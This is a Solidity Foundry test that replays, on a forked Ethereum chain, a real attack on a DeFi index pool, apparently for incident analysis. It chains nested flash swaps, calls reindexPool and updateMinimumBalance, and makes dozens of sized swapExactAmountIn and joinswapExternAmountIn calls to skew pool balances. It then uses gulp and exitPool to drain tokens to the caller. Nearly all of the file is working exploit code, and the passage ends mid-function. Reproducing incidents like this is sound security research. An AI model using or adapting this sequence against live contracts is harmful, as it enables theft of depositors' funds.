// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

// https://explorer.phalcon.xyz/tx/eth/0x44aad3b853866468161735496a5d9cc961ce5aa872924c5d78673076b1cd95aa
// https://etherscan.io/address/0xBA5Ed1488bE60BA2FACC6B66C6D6F0beFba22eBe

interface I {
    function reindexPool(address) external payable;
    function getBalance(address) external payable;
    function updateCategoryPrices(uint256) external payable;
    function swapTokensForExactETH(uint256, uint256, address[] memory, address, uint256) external payable;
    function approve(address, uint256) external payable;
    function transfer(address, uint256) external payable;
    function gulp(address) external payable;
    function swapTokensForExactTokens(uint256, uint256, address[] memory, address, uint256) external payable;
    function balanceOf(address) external payable returns (uint256);
    function getTopCategoryTokens(uint256, uint256) external payable;
    function getReserves() external payable returns (uint112, uint112, uint32);
    function orderCategoryTokensByMarketCap(uint256) external payable;
    function swap(uint256, uint256, address, bytes memory) external payable;
    function joinswapExternAmountIn(address, uint256, uint256) external payable;
    function updateMinimumBalance(address, address) external payable;
    function getTotalDenormalizedWeight() external payable;
    function extrapolatePoolValueFromToken() external payable;
    function swapExactAmountIn(address, uint256, address, uint256, uint256) external payable;
    function exitPool(uint256, uint256[] memory) external payable;
}

contract X277e is Test {
    address immutable r = address(this);
    receive() external payable {}

    function setUp() public pure {
        console2.log("0x44aad3b853866468161735496a5d9cc961ce5aa872924c5d78673076b1cd95aa");
    }

    address constant x1f98 = 0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984;
    address constant x3150 = 0x31503dcb60119A812feE820bb7042752019F2355;
    address constant x58dc = 0x58Dc5a51fE44589BEb22E8CE67720B5BC5378009;
    address constant x636f = 0x000000000000000000636F6e736F6c652e6c6f67;
    address constant x6b35 = 0x6B3595068778DD592e39A122f4f5a5cF09C90fE2;
    address constant x7950 = 0x795065dCc9f64b5614C407a6EFDC400DA6221FB0;
    address constant x7a25 = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address constant x7fc6 = 0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9;
    address constant x9f8f = 0x9f8F72aA9304c8B593d555F12eF6589cC3A579A2;
    address constant xa1d7 = 0xA1d7b2d891e3A1f9ef4bBC5be20630C2FEB1c470;
    address constant xba13 = 0xBa13afEcda9beB75De5c56BbAF696b880a5A50dD;
    address constant xc00e = 0xc00e94Cb662C3520282E6f5717214004A7f26888;
    address constant xc011 = 0xC011a73ee8576Fb46F5E1c5751cA3B9Fe0af2a6F;
    address constant xc02a = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address constant xd3d2 = 0xd3d2E2692501A5c9Ca623199D38826e513033a17;
    address constant xd533 = 0xD533a949740bb3306d119CC777fa900bA034cd52;
    address constant xd75e = 0xD75EA151a61d06868E31F8988D28DFE5E9df57B4;
    address constant xf00a = 0xF00A38376C8668fC1f3Cd3dAeef42E0E44A7Fcdb;
    address constant xfa6d = 0xfa6de2697D59E88Ed7Fc4dFE5A33daC43565ea41;

    address x7b91;
    address xb634;
    address xfbc2;

    uint256 t_uniswapV2Call = 0;

    function test1() public {
        // vm.startPrank(0xBA5Ed1488bE60BA2FACC6B66C6D6F0beFba22eBe, 0xBA5Ed1488bE60BA2FACC6B66C6D6F0beFba22eBe);

        vm.createSelectFork("http://localhost:18545", 13417948); // tx.blockNumber - 1
        // vm.createSelectFork("http://localhost:18545", bytes32(0xf57a9218cf3ce054c1770db0206594860663d33d8dceb122f037e47854db3cf2));

        // https://explorer.phalcon.xyz/tx/eth/0xf57a9218cf3ce054c1770db0206594860663d33d8dceb122f037e47854db3cf2
        this.xf57a9218();
        // https://explorer.phalcon.xyz/tx/eth/0x05a135501fe28d21788aab85d77295de6307f05355cff77db7e0901d4c8552db
        this.x05a13550();
        // https://explorer.phalcon.xyz/tx/eth/0x9d79a5a7648f44e74b34166e1513f51695f517e2cbf096fd9ae795e5d0d4ea8e
        this.x9d79a5a7();
        // https://explorer.phalcon.xyz/tx/eth/0xd76d06a81b8e29f0348b68005ac395e3295586c921fbbae4deb60a0c92266983
        this.xd76d06a8();
        // https://explorer.phalcon.xyz/tx/eth/0x89ff7a0c417870bfc8e5f4f1ae19426017a53134393f54fc7bab17392843b1a9
        this.x89ff7a0c();
        // https://explorer.phalcon.xyz/tx/eth/0x44aad3b853866468161735496a5d9cc961ce5aa872924c5d78673076b1cd95aa
        x807a994a();
    }

    function test2() public {
        // vm.startPrank(0xBA5Ed1488bE60BA2FACC6B66C6D6F0beFba22eBe, 0xBA5Ed1488bE60BA2FACC6B66C6D6F0beFba22eBe);

        vm.createSelectFork("http://localhost:18545", 13414664); // tx.blockNumber - 1
        // https://explorer.phalcon.xyz/tx/eth/0xf57a9218cf3ce054c1770db0206594860663d33d8dceb122f037e47854db3cf2
        this.xf57a9218();
        vm.warp(1634194474);
        vm.roll(13414856);
        // https://explorer.phalcon.xyz/tx/eth/0x05a135501fe28d21788aab85d77295de6307f05355cff77db7e0901d4c8552db
        this.x05a13550();
        vm.warp(1634214629);
        vm.roll(13416331);
        // https://explorer.phalcon.xyz/tx/eth/0x9d79a5a7648f44e74b34166e1513f51695f517e2cbf096fd9ae795e5d0d4ea8e
        this.x9d79a5a7();
        vm.warp(1634227389);
        vm.roll(13417301);
        // https://explorer.phalcon.xyz/tx/eth/0xd76d06a81b8e29f0348b68005ac395e3295586c921fbbae4deb60a0c92266983
        this.xd76d06a8();
        vm.warp(1634227565);
        vm.roll(13417319);
        // https://explorer.phalcon.xyz/tx/eth/0x89ff7a0c417870bfc8e5f4f1ae19426017a53134393f54fc7bab17392843b1a9
        this.x89ff7a0c();
        vm.warp(1634236663);
        vm.roll(13417948);
        // https://explorer.phalcon.xyz/tx/eth/0x44aad3b853866468161735496a5d9cc961ce5aa872924c5d78673076b1cd95aa
        x807a994a();
    }

    function test3() public {
        // vm.startPrank(, );

        vm.createSelectFork("http://localhost:18545", 13417948); // tx.blockNumber - 1

        vm.warp(1634236663);
        vm.roll(13417949);
        // https://explorer.phalcon.xyz/tx/eth/0x44aad3b853866468161735496a5d9cc961ce5aa872924c5d78673076b1cd95aa
        x807a994a();
    }

    function x9d79a5a7() public {
        xfbc2 = address(new Xfbc2());
    }

    function x807a994a() public {
        I(xf00a).reindexPool(xfa6d);
        I(xfa6d).getTotalDenormalizedWeight();
        // uint112 v1 = 2040380055722398017005820;
        // uint112 v2 = 14205874295200401167659;
        // uint32 v3 = 1634236601;
        (uint112 v1, uint112 v2, uint32 v3) = I(xd3d2).getReserves();
        console2.log("I(xd3d2).getReserves()\t->", v1, v2, v3);
        // uint112 v4 = 245797074201685785851780;
        // uint112 v5 = 19839761765715204123756;
        // uint32 v6 = 1634231387;
        (uint112 v4, uint112 v5, uint32 v6) = I(xd75e).getReserves();
        console2.log("I(xd75e).getReserves()\t->", v4, v5, v6);
        // uint112 v7 = 45967943613408222842691;
        // uint112 v8 = 3828897259563068853353;
        // uint32 v9 = 1634234040;
        (uint112 v7, uint112 v8, uint32 v9) = I(x3150).getReserves();
        console2.log("I(x3150).getReserves()\t->", v7, v8, v9);
        // uint112 v10 = 2774758398770038031362;
        // uint112 v11 = 3567674324434551217279980;
        // uint32 v12 = 1634235722;
        (uint112 v10, uint112 v11, uint32 v12) = I(x58dc).getReserves();
        console2.log("I(x58dc).getReserves()\t->", v10, v11, v12);
        // uint112 v13 = 6417586688442225624158;
        // uint112 v14 = 4358981223283552588812;
        // uint32 v15 = 1634231612;
        (uint112 v13, uint112 v14, uint32 v15) = I(xba13).getReserves();
        console2.log("I(xba13).getReserves()\t->", v13, v14, v15);
        // uint112 v16 = 504050324955865278344090;
        // uint112 v17 = 1300507828109584991422;
        // uint32 v18 = 1634236217;
        (uint112 v16, uint112 v17, uint32 v18) = I(xa1d7).getReserves();
        console2.log("I(xa1d7).getReserves()\t->", v16, v17, v18);
        X277e(payable(r)).uniswapV2Call(r, 0, 0, hex"6e6967676572");
        // uint256 v19 = 192358608482349254932721;
        uint256 v19 = I(x1f98).balanceOf(r);
        console2.log("I(x1f98).balanceOf(r)\t\t->", "192358608482349254932721 (192358.6084 ether)");
        I(x1f98).transfer(tx.origin, v19);
        // uint256 v20 = 6226808757621079923542;
        uint256 v20 = I(x7fc6).balanceOf(r);
        console2.log("I(x7fc6).balanceOf(r)\t\t->", "6226808757621079923542 (6226.8087 ether)");
        I(x7fc6).transfer(tx.origin, v20);
        // uint256 v21 = 5459533319030510670384;
        uint256 v21 = I(xc00e).balanceOf(r);
        console2.log("I(xc00e).balanceOf(r)\t\t->", "5459533319030510670384 (5459.5333 ether)");
        I(xc00e).transfer(tx.origin, v21);
        // uint256 v22 = 721611340121392718122545;
        uint256 v22 = I(xd533).balanceOf(r);
        console2.log("I(xd533).balanceOf(r)\t\t->", "721611340121392718122545 (721611.3401 ether)");
        I(xd533).transfer(tx.origin, v22);
        // uint256 v23 = 406568450634979514865;
        uint256 v23 = I(x9f8f).balanceOf(r);
        console2.log("I(x9f8f).balanceOf(r)\t\t->", "406568450634979514865 (406.5684 ether)");
        I(x9f8f).transfer(tx.origin, v23);
        // uint256 v24 = 16680624942480894626934;
        uint256 v24 = I(xc011).balanceOf(r);
        console2.log("I(xc011).balanceOf(r)\t\t->", "16680624942480894626934 (16680.6249 ether)");
        I(xc011).transfer(tx.origin, v24);
    }

    function xf57a9218() public {
        x7b91 = address(new X7b91());
    }

    function x05a13550() public {
        X7b91(payable(x7b91)).lockIn();
    }

    function xd76d06a8() public {
        _constructor_();
    }

    function x89ff7a0c() public {
        xb634 = address(new Xb634());
    }

    function uniswapV2Call(address, uint256, uint256, bytes memory) public {
        t_uniswapV2Call++;

        if (t_uniswapV2Call == 1) {
            I(x1f98).approve(xfa6d, type(uint256).max);
            I(xd3d2).swap(1836342050150158215305238, 0, r, hex"6e6967676572");
            return;
        }
        if (t_uniswapV2Call == 2) {
            I(x7fc6).approve(xfa6d, type(uint256).max);
            I(xd75e).swap(221217366781517207266602, 0, r, hex"6e6967676572");
            return;
        }
        if (t_uniswapV2Call == 3) {
            I(xc00e).approve(xfa6d, type(uint256).max);
            I(x3150).swap(41371149252067400558421, 0, r, hex"6e6967676572");
            return;
        }
        if (t_uniswapV2Call == 4) {
            I(xd533).approve(xfa6d, type(uint256).max);
            I(x58dc).swap(0, 3210906891991096095551982, r, hex"6e6967676572");
            return;
        }
        if (t_uniswapV2Call == 5) {
            I(x9f8f).approve(xfa6d, type(uint256).max);
            I(xba13).swap(5775828019598003061742, 0, r, hex"6e6967676572");
            return;
        }
        if (t_uniswapV2Call == 6) {
            I(xc011).approve(xfa6d, type(uint256).max);
            I(xa1d7).swap(453645292460278750509681, 0, r, hex"6e6967676572");
            return;
        }
        if (t_uniswapV2Call == 7) {
            X277e(payable(r)).uniswapV2Call(r, 0, 0, hex"6e6967676572");
            return;
        }
        if (t_uniswapV2Call == 8) {
            I(xfa6d).extrapolatePoolValueFromToken();
            // uint256 v1 = 221217366781517207266602;
            uint256 v1 = I(x7fc6).balanceOf(r);
            console2.log("I(x7fc6).balanceOf(r)\t\t->", "221217366781517207266602 (221217.3667 ether)");
            I(xfa6d).getBalance(x7fc6);
            I(xfa6d)
                .swapExactAmountIn(
                    x7fc6, 3751636470161434234300, x1f98, 0, 100000000000000000000000000000000000000000000000000
                );
            I(xfa6d).getBalance(x7fc6);
            I(xfa6d)
                .swapExactAmountIn(
                    x7fc6, 5627454705242151351450, x1f98, 0, 100000000000000000000000000000000000000000000000000
                );
            I(xfa6d).getBalance(x7fc6);
            I(xfa6d)
                .swapExactAmountIn(
                    x7fc6, 8441182057863227027175, x1f98, 0, 100000000000000000000000000000000000000000000000000
                );
            I(xfa6d).getBalance(x7fc6);
            I(xfa6d)
                .swapExactAmountIn(
                    x7fc6, 12661773086794840540762, x1f98, 0, 100000000000000000000000000000000000000000000000000
                );
            I(xfa6d).getBalance(x7fc6);
            I(xfa6d)
                .swapExactAmountIn(
                    x7fc6, 18992659630192260811143, x1f98, 0, 100000000000000000000000000000000000000000000000000
                );
            I(xfa6d).getBalance(x7fc6);
            I(xfa6d)
                .swapExactAmountIn(
                    x7fc6, 28488989445288391216715, x1f98, 0, 100000000000000000000000000000000000000000000000000
                );
            I(xfa6d).getBalance(x7fc6);
            I(xfa6d)
                .swapExactAmountIn(
                    x7fc6, 42733484167932586825072, x1f98, 0, 100000000000000000000000000000000000000000000000000
                );
            I(xfa6d).getBalance(x7fc6);
            I(xfa6d)
                .swapExactAmountIn(
                    x7fc6, 64100226251898880237608, x1f98, 0, 100000000000000000000000000000000000000000000000000
                );
            I(xfa6d).getBalance(x7fc6);
            I(xfa6d)
                .swapExactAmountIn(
                    x7fc6, 36419960966143435022377, x1f98, 0, 100000000000000000000000000000000000000000000000000
                );
            // uint256 v2 = 41371149252067400558421;
            uint256 v2 = I(xc00e).balanceOf(r);
            console2.log("I(xc00e).balanceOf(r)\t\t->", "41371149252067400558421 (41371.1492 ether)");
            I(xfa6d).getBalance(xc00e);
            I(xfa6d)
                .swapExactAmountIn(
                    xc00e, 2854686651329892269395, x1f98, 0, 100000000000000000000000000000000000000000000000000
                );
            I(xfa6d).getBalance(xc00e);
            I(xfa6d)
                .swapExactAmountIn(
                    xc00e, 4282029976994838404092, x1f98, 0, 100000000000000000000000000000000000000000000000000
                );
            I(xfa6d).getBalance(xc00e);
            I(xfa6d)
                .swapExactAmountIn(
                    xc00e, 6423044965492257606138, x1f98, 0, 100000000000000000000000000000000000000000000000000
                );
            I(xfa6d).getBalance(xc00e);
            I(xfa6d)
                .swapExactAmountIn(
                    xc00e, 9634567448238386409207, x1f98, 0, 100000000000000000000000000000000000000000000000000
                );
            I(xfa6d).getBalance(xc00e);
            {
                I(xfa6d)
                    .swapExactAmountIn(
                        xc00e, 14451851172357579613811, x1f98, 0, 100000000000000000000000000000000000000000000000000
                    );
                I(xfa6d).getBalance(xc00e);
                I(xfa6d)
                    .swapExactAmountIn(
                        xc00e, 3724969037654446255778, x1f98, 0, 100000000000000000000000000000000000000000000000000
                    );
                // uint256 v3 = 3210906891991096095551982;
                uint256 v3 = I(xd533).balanceOf(r);
                console2.log("I(xd533).balanceOf(r)\t\t->", "3210906891991096095551982 (3210906.8919 ether)");
                I(xfa6d).getBalance(xd533);
                I(xfa6d)
                    .swapExactAmountIn(
                        xd533, 370886640730278300607984, x1f98, 0, 100000000000000000000000000000000000000000000000000
                    );
                I(xfa6d).getBalance(xd533);
                I(xfa6d)
                    .swapExactAmountIn(
                        xd533, 556329961095417450911976, x1f98, 0, 100000000000000000000000000000000000000000000000000
                    );
                I(xfa6d).getBalance(xd533);
                I(xfa6d)
                    .swapExactAmountIn(
                        xd533, 834494941643126176367964, x1f98, 0, 100000000000000000000000000000000000000000000000000
                    );
                I(xfa6d).getBalance(xd533);
                I(xfa6d)
                    .swapExactAmountIn(
                        xd533, 1251742412464689264551946, x1f98, 0, 100000000000000000000000000000000000000000000000000
                    );
                I(xfa6d).getBalance(xd533);
                I(xfa6d)
                    .swapExactAmountIn(
                        xd533, 197452936057584903112112, x1f98, 0, 100000000000000000000000000000000000000000000000000
                    );
                // uint256 v4 = 5775828019598003061742;
                uint256 v4 = I(x9f8f).balanceOf(r);
                console2.log("I(x9f8f).balanceOf(r)\t\t->", "5775828019598003061742 (5775.8280 ether)");
                I(xfa6d).getBalance(x9f8f);
                I(xfa6d)
                    .swapExactAmountIn(
                        x9f8f, 319371753079088432556, x1f98, 0, 100000000000000000000000000000000000000000000000000
                    );
                I(xfa6d).getBalance(x9f8f);
                I(xfa6d)
                    .swapExactAmountIn(
                        x9f8f, 479057629618632648834, x1f98, 0, 100000000000000000000000000000000000000000000000000
                    );
                I(xfa6d).getBalance(x9f8f);
                I(xfa6d)
                    .swapExactAmountIn(
                        x9f8f, 718586444427948973251, x1f98, 0, 100000000000000000000000000000000000000000000000000
                    );
                I(xfa6d).getBalance(x9f8f);
                I(xfa6d)
                    .swapExactAmountIn(
                        x9f8f, 1077879666641923459876, x1f98, 0, 100000000000000000000000000000000000000000000000000
                    );
                I(xfa6d).getBalance(x9f8f);
                I(xfa6d)
                    .swapExactAmountIn(
                        x9f8f, 1616819499962885189814, x1f98, 0, 100000000000000000000000000000000000000000000000000
                    );
                I(xfa6d).getBalance(x9f8f);
                I(xfa6d)
                    .swapExactAmountIn(
                        x9f8f, 1564113025867524357411, x1f98, 0, 100000000000000000000000000000000000000000000000000
                    );
                // uint256 v5 = 453645292460278750509681;
                uint256 v5 = I(xc011).balanceOf(r);
                console2.log("I(xc011).balanceOf(r)\t\t->", "453645292460278750509681 (453645.2924 ether)");
                I(xfa6d).getBalance(xc011);
                I(xfa6d)
                    .swapExactAmountIn(
                        xc011, 9654184036584098664417, x1f98, 0, 100000000000000000000000000000000000000000000000000
                    );
            }
            {
                I(xfa6d).getBalance(xc011);
                I(xfa6d)
                    .swapExactAmountIn(
                        xc011, 14481276054876147996625, x1f98, 0, 100000000000000000000000000000000000000000000000000
                    );
                I(xfa6d).getBalance(xc011);
                I(xfa6d)
                    .swapExactAmountIn(
                        xc011, 21721914082314221994938, x1f98, 0, 100000000000000000000000000000000000000000000000000
                    );
                I(xfa6d).getBalance(xc011);
                I(xfa6d)
                    .swapExactAmountIn(
                        xc011, 32582871123471332992407, x1f98, 0, 100000000000000000000000000000000000000000000000000
                    );
                I(xfa6d).getBalance(xc011);
                I(xfa6d)
                    .swapExactAmountIn(
                        xc011, 48874306685206999488610, x1f98, 0, 100000000000000000000000000000000000000000000000000
                    );
                I(xfa6d).getBalance(xc011);
                I(xfa6d)
                    .swapExactAmountIn(
                        xc011, 73311460027810499232915, x1f98, 0, 100000000000000000000000000000000000000000000000000
                    );
                I(xfa6d).getBalance(xc011);
                I(xfa6d)
                    .swapExactAmountIn(
                        xc011, 109967190041715748849373, x1f98, 0, 100000000000000000000000000000000000000000000000000
                    );
                I(xfa6d).getBalance(xc011);
                I(xfa6d)
                    .swapExactAmountIn(
                        xc011, 143052090408299701290396, x1f98, 0, 100000000000000000000000000000000000000000000000000
                    );
                I(xfa6d).extrapolatePoolValueFromToken();
                I(xf00a).updateMinimumBalance(xfa6d, x6b35);
                // uint256 v6 = 2034882085634528539844733;
                uint256 v6 = I(x1f98).balanceOf(r);
                console2.log("I(x1f98).balanceOf(r)\t\t->", "2034882085634528539844733 (2034882.8563 ether)");
                // uint256 v7 = 2034882085634528539844733;
                uint256 v7 = I(x1f98).balanceOf(r);
                console2.log("I(x1f98).balanceOf(r)\t\t->", "2034882085634528539844733 (2034882.8563 ether)");
                I(xfa6d).getBalance(x1f98);
                I(xfa6d).joinswapExternAmountIn(x1f98, 2389414860885138837488, 0);
                // uint256 v8 = 2032492670773643401007245;
                uint256 v8 = I(x1f98).balanceOf(r);
                console2.log("I(x1f98).balanceOf(r)\t\t->", "2032492670773643401007245 (2032492.6707 ether)");
                // uint256 v9 = 2032492670773643401007245;
                uint256 v9 = I(x1f98).balanceOf(r);
                console2.log("I(x1f98).balanceOf(r)\t\t->", "2032492670773643401007245 (2032492.6707 ether)");
                I(xfa6d).getBalance(x1f98);
                I(xfa6d).joinswapExternAmountIn(x1f98, 3584122291327708256232, 0);
                // uint256 v10 = 2028908548482315692751013;
                uint256 v10 = I(x1f98).balanceOf(r);
                console2.log("I(x1f98).balanceOf(r)\t\t->", "2028908548482315692751013 (2028908.5484 ether)");
                // uint256 v11 = 2028908548482315692751013;
                uint256 v11 = I(x1f98).balanceOf(r);
                console2.log("I(x1f98).balanceOf(r)\t\t->", "2028908548482315692751013 (2028908.5484 ether)");
                I(xfa6d).getBalance(x1f98);
                I(xfa6d).joinswapExternAmountIn(x1f98, 5376183436991562384348, 0);
                // uint256 v12 = 2023532365045324130366665;
                uint256 v12 = I(x1f98).balanceOf(r);
                console2.log("I(x1f98).balanceOf(r)\t\t->", "2023532365045324130366665 (2023532.3650 ether)");
                // uint256 v13 = 2023532365045324130366665;
                uint256 v13 = I(x1f98).balanceOf(r);
                console2.log("I(x1f98).balanceOf(r)\t\t->", "2023532365045324130366665 (2023532.3650 ether)");
            }
            {
                I(xfa6d).getBalance(x1f98);
                I(xfa6d).joinswapExternAmountIn(x1f98, 8064275155487343576522, 0);
                // uint256 v14 = 2015468089889836786790143;
                uint256 v14 = I(x1f98).balanceOf(r);
                console2.log("I(x1f98).balanceOf(r)\t\t->", "2015468089889836786790143 (2015468.8988 ether)");
                // uint256 v15 = 2015468089889836786790143;
                uint256 v15 = I(x1f98).balanceOf(r);
                console2.log("I(x1f98).balanceOf(r)\t\t->", "2015468089889836786790143 (2015468.8988 ether)");
                I(xfa6d).getBalance(x1f98);
                I(xfa6d).joinswapExternAmountIn(x1f98, 12096412733231015364783, 0);
                // uint256 v16 = 2003371677156605771425360;
                uint256 v16 = I(x1f98).balanceOf(r);
                console2.log("I(x1f98).balanceOf(r)\t\t->", "2003371677156605771425360 (2003371.6771 ether)");
                // uint256 v17 = 2003371677156605771425360;
                uint256 v17 = I(x1f98).balanceOf(r);
                console2.log("I(x1f98).balanceOf(r)\t\t->", "2003371677156605771425360 (2003371.6771 ether)");
                I(xfa6d).getBalance(x1f98);
                I(xfa6d).joinswapExternAmountIn(x1f98, 18144619099846523047174, 0);
                // uint256 v18 = 1985227058056759248378186;
                uint256 v18 = I(x1f98).balanceOf(r);
                console2.log("I(x1f98).balanceOf(r)\t\t->", "1985227058056759248378186 (1985227.5805 ether)");
                // uint256 v19 = 1985227058056759248378186;
                uint256 v19 = I(x1f98).balanceOf(r);
                console2.log("I(x1f98).balanceOf(r)\t\t->", "1985227058056759248378186 (1985227.5805 ether)");
                I(xfa6d).getBalance(x1f98);
                I(xfa6d).joinswapExternAmountIn(x1f98, 27216928649769784570761, 0);
                // uint256 v20 = 1958010129406989463807425;
                uint256 v20 = I(x1f98).balanceOf(r);
                console2.log("I(x1f98).balanceOf(r)\t\t->", "1958010129406989463807425 (1958010.1294 ether)");
                // uint256 v21 = 1958010129406989463807425;
                uint256 v21 = I(x1f98).balanceOf(r);
                console2.log("I(x1f98).balanceOf(r)\t\t->", "1958010129406989463807425 (1958010.1294 ether)");
                I(xfa6d).getBalance(x1f98);
                I(xfa6d).joinswapExternAmountIn(x1f98, 40825392974654676856142, 0);
                // uint256 v22 = 1917184736432334786951283;
                uint256 v22 = I(x1f98).balanceOf(r);
                console2.log("I(x1f98).balanceOf(r)\t\t->", "1917184736432334786951283 (1917184.7364 ether)");
                // uint256 v23 = 1917184736432334786951283;
                uint256 v23 = I(x1f98).balanceOf(r);
                console2.log("I(x1f98).balanceOf(r)\t\t->", "1917184736432334786951283 (1917184.7364 ether)");
                I(xfa6d).getBalance(x1f98);
                I(xfa6d).joinswapExternAmountIn(x1f98, 61238089461982015284213, 0);
                // uint256 v24 = 1855946646970352771667070;
                uint256 v24 = I(x1f98).balanceOf(r);
                console2.log("I(x1f98).balanceOf(r)\t\t->", "1855946646970352771667070 (1855946.6469 ether)");
                // uint256 v25 = 1855946646970352771667070;
                uint256 v25 = I(x1f98).balanceOf(r);
                console2.log("I(x1f98).balanceOf(r)\t\t->", "1855946646970352771667070 (1855946.6469 ether)");
                I(xfa6d).getBalance(x1f98);
                I(xfa6d).joinswapExternAmountIn(x1f98, 91857134192973022926319, 0);
                // uint256 v26 = 1764089512777379748740751;
                uint256 v26 = I(x1f98).balanceOf(r);
                console2.log("I(x1f98).balanceOf(r)\t\t->", "1764089512777379748740751 (1764089.5127 ether)");
                // uint256 v27 = 1764089512777379748740751;
                uint256 v27 = I(x1f98).balanceOf(r);
                console2.log("I(x1f98).balanceOf(r)\t\t->", "1764089512777379748740751 (1764089.5127 ether)");
                I(xfa6d).getBalance(x1f98);
                I(xfa6d).joinswapExternAmountIn(x1f98, 137785701289459534389479, 0);
            }
            {
                // uint256 v28 = 1626303811487920214351272;
                uint256 v28 = I(x1f98).balanceOf(r);
                console2.log("I(x1f98).balanceOf(r)\t\t->", "1626303811487920214351272 (1626303.8114 ether)");
                // uint256 v29 = 1626303811487920214351272;
                uint256 v29 = I(x1f98).balanceOf(r);
                console2.log("I(x1f98).balanceOf(r)\t\t->", "1626303811487920214351272 (1626303.8114 ether)");
                I(xfa6d).getBalance(x1f98);
                I(xfa6d).joinswapExternAmountIn(x1f98, 206678551934189301584218, 0);
                // uint256 v30 = 1419625259553730912767054;
                uint256 v30 = I(x1f98).balanceOf(r);
                console2.log("I(x1f98).balanceOf(r)\t\t->", "1419625259553730912767054 (1419625.2595 ether)");
                // uint256 v31 = 1419625259553730912767054;
                uint256 v31 = I(x1f98).balanceOf(r);
                console2.log("I(x1f98).balanceOf(r)\t\t->", "1419625259553730912767054 (1419625.2595 ether)");
                I(xfa6d).getBalance(x1f98);
                I(xfa6d).joinswapExternAmountIn(x1f98, 310017827901283952376327, 0);
                // uint256 v32 = 1109607431652446960390727;
                uint256 v32 = I(x1f98).balanceOf(r);
                console2.log("I(x1f98).balanceOf(r)\t\t->", "1109607431652446960390727 (1109607.4316 ether)");
                // uint256 v33 = 1109607431652446960390727;
                uint256 v33 = I(x1f98).balanceOf(r);
                console2.log("I(x1f98).balanceOf(r)\t\t->", "1109607431652446960390727 (1109607.4316 ether)");
                I(xfa6d).getBalance(x1f98);
                I(xfa6d).joinswapExternAmountIn(x1f98, 465026741851925928564491, 0);
                // uint256 v34 = 644580689800521031826236;
                uint256 v34 = I(x1f98).balanceOf(r);
                console2.log("I(x1f98).balanceOf(r)\t\t->", "644580689800521031826236 (644580.6898 ether)");
                // uint256 v35 = 644580689800521031826236;
                uint256 v35 = I(x1f98).balanceOf(r);
                console2.log("I(x1f98).balanceOf(r)\t\t->", "644580689800521031826236 (644580.6898 ether)");
                I(xfa6d).getBalance(x1f98);
                I(xfa6d).joinswapExternAmountIn(x1f98, v35, 0);
                // uint256 v36 = 0;
                uint256 v36 = I(x1f98).balanceOf(r);
                console2.log("I(x1f98).balanceOf(r)\t\t->", uint256(0));
                I(x7950).swap(220000000000000000000000, 0, r, hex"6e6967676572");
            }
            return;
        }
        if (t_uniswapV2Call == 9) {
            I(x6b35).transfer(xfa6d, 220000000000000000000000);
            I(xfa6d).gulp(x6b35);
            // uint256 v1 = 1397888611775446039302736;
            uint256 v1 = I(xfa6d).balanceOf(r);
            console2.log("I(xfa6d).balanceOf(r)\t\t->", "1397888611775446039302736 (1397888.6117 ether)");

            uint256[] memory arr12 = new uint256[](7);
            arr12[0] = 0;
            arr12[1] = 0;
            arr12[2] = 0;
            arr12[3] = 0;
            arr12[4] = 0;
            arr12[5] = 0;
            arr12[6] = 0;
            I(xfa6d).exitPool(v1, arr12);

            I(x6b35).approve(xfa6d, type(uint256).max);
            // uint256 v2 = 197554697694574605660000;
            uint256 v2 = I(x6b35).balanceOf(r);
            console2.log("I(x6b35).balanceOf(r)\t\t->", "197554697694574605660000 (197554.6976 ether)");
            // uint256 v3 = 197554697694574605660000;
            uint256 v3 = I(x6b35).balanceOf(r);
            console2.log("I(x6b35).balanceOf(r)\t\t->", "197554697694574605660000 (197554.6976 ether)");
            I(xfa6d).getBalance(x6b35);
            I(xfa6d).joinswapExternAmountIn(x6b35, 11222651152712697170000, 0);
            // uint256 v4 = 186332046541861908490000;
            uint256 v4 = I(x6b35).balanceOf(r);
            console2.log("I(x6b35).balanceOf(r)\t\t->", "186332046541861908490000 (186332.4654 ether)");
            // uint256 v5 = 186332046541861908490000;
            uint256 v5 = I(x6b35).balanceOf(r);
            console2.log("I(x6b35).balanceOf(r)\t\t->", "186332046541861908490000 (186332.4654 ether)");
            I(xfa6d).getBalance(x6b35);
            I(xfa6d).joinswapExternAmountIn(x6b35, 16833976729069045755000, 0);
            // uint256 v6 = 169498069812792862735000;
            uint256 v6 = I(x6b35).balanceOf(r);
            console2.log("I(x6b35).balanceOf(r)\t\t->", "169498069812792862735000 (169498.6981 ether)");
            // uint256 v7 = 169498069812792862735000;
            uint256 v7 = I(x6b35).balanceOf(r);
            console2.log("I(x6b35).balanceOf(r)\t\t->", "169498069812792862735000 (169498.6981 ether)");
            I(xfa6d).getBalance(x6b35);
            I(xfa6d).joinswapExternAmountIn(x6b35, 25250965093603568632500, 0);
            // uint256 v8 = 144247104719189294102500;
            uint256 v8 = I(x6b35).balanceOf(r);
            console2.log("I(x6b35).balanceOf(r)\t\t->", "144247104719189294102500 (144247.1047 ether)");
            // uint256 v9 = 144247104719189294102500;
            uint256 v9 = I(x6b35).balanceOf(r);
            console2.log("I(x6b35).balanceOf(r)\t\t->", "144247104719189294102500 (144247.1047 ether)");
            I(xfa6d).getBalance(x6b35);
            I(xfa6d).joinswapExternAmountIn(x6b35, 37876447640405352948750, 0);
            // uint256 v10 = 106370657078783941153750;
            uint256 v10 = I(x6b35).balanceOf(r);
            console2.log("I(x6b35).balanceOf(r)\t\t->", "106370657078783941153750 (106370.6570 ether)");
            // uint256 v11 = 106370657078783941153750;
            uint256 v11 = I(x6b35).balanceOf(r);
            console2.log("I(x6b35).balanceOf(r)\t\t->", "106370657078783941153750 (106370.6570 ether)");
            I(xfa6d).getBalance(x6b35);
            I(xfa6d).joinswapExternAmountIn(x6b35, 56814671460608029423125, 0);
            // uint256 v12 = 49555985618175911730625;
            uint256 v12 = I(x6b35).balanceOf(r);
            console2.log("I(x6b35).balanceOf(r)\t\t->", "49555985618175911730625 (49555.9856 ether)");
            // uint256 v13 = 49555985618175911730625;
            uint256 v13 = I(x6b35).balanceOf(r);
            console2.log("I(x6b35).balanceOf(r)\t\t->", "49555985618175911730625 (49555.9856 ether)");
            I(xfa6d).getBalance(x6b35);
            I(xfa6d).joinswapExternAmountIn(x6b35, v13, 0);
            // uint256 v14 = 0;
            uint256 v14 = I(x6b35).balanceOf(r);
            console2.log("I(x6b35).balanceOf(r)\t\t->", uint256(0));
